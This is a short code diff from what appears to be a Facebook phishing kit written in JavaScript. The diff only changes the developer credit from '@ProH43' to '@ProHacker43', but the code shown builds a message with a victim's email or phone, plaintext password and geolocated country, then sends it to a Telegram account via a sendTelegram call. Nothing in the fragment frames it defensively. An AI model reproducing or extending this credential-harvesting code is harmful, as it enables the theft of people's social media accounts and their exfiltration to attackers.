@@ -121,7 +121,7 @@
     const country = geo.country_name || "Unknown";
     const flag = getFlag(geo.country_code);
 
-    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProH43`;
+    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProHacker43`;
 
     // 1. First: Send to user's Telegram
     await sendTelegram(telegramId, msg);
